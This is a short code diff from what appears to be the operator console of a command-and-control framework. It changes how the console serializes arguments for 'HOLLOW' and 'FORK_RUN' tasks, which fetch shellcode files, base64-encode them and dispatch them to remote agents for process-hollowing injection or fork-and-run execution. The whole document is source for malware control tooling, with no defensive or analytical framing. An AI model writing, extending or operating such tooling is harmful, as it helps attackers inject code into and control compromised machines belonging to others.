@@ -10010,7 +10010,7 @@ async function dispatchConsoleCmd(agentID, cmdLine) {
         const sc = await fetchSCFile(hPayload);
         payload  = u8ToB64(sc);
         taskType = 'HOLLOW';
-        taskArgs = hTarget;
+        taskArgs = JSON.stringify({target: hTarget});
       } catch(e) { addConsoleOutput('', 'hollow error: '+e.message, null); return; }
       break;
     }
@@ -10131,7 +10131,7 @@ async function dispatchConsoleCmd(agentID, cmdLine) {
         const sc = await fetchSCFile(parts4[0]);
         payload = u8ToB64(sc);
         taskType = 'FORK_RUN';
-        taskArgs = parts4.slice(1).join(' ');
+        taskArgs = JSON.stringify({cmd: parts4.slice(1).join(' ')});
       } catch(e) { addConsoleOutput('', e.message, null); return; }
       break;
     }
